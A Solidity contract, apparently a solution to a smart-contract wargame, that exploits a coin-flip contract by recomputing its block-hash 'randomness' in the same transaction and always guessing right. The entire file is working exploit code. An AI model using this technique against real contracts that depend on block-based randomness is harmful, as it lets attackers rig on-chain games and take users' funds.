// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipAttacker {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    function attack(address targetAddress) external onlyOwner returns (bool) {
        ICoinFlip target = ICoinFlip(targetAddress);
        
        // Log current wins before attack
        uint256 beforeWins = target.consecutiveWins();
        
        // Calculate the correct guess IN THE SAME TRANSACTION as the flip call
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool side = blockValue / FACTOR == 1 ? true : false;
        
        // Execute the flip
        bool result = target.flip(side);
        
        // Log after attack to verify
        uint256 afterWins = target.consecutiveWins();
        
        // The attack succeeded only if the win count increased
        return (afterWins > beforeWins);
    }
    
    function getWinCount(address targetAddress) external view returns (uint256) {
        return ICoinFlip(targetAddress).consecutiveWins();
    }
} 